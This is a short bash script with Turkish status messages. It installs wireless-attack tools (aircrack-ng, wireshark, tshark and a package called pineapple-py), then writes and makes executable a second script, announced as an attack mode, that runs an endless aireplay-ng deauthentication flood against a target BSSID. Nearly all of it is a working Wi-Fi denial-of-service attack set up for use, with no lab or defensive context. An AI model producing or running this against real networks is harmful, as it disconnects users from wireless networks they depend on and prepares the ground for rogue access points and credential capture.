#!/bin/bash
# Wi-Fi Pineapple Setup
echo "[+] Wi-Fi Pineapple kurulumu..."

# Dependencies
sudo apt-get update -qq
sudo apt-get install -y -qq aircrack-ng wireshark tshark

# Wi-Fi Pineapple API
pip3 install pineapple-py

# Setup script
cat > /workspace/pineapple-attack.sh << 'EOF'
#!/bin/bash
echo "[+] Wi-Fi Pineapple saldırı modu..."
# Deauth attack
aireplay-ng -0 0 -a \$TARGET_BSSID wlan0mon
EOF
chmod +x /workspace/pineapple-attack.sh

echo "[+] Wi-Fi Pineapple hazir."
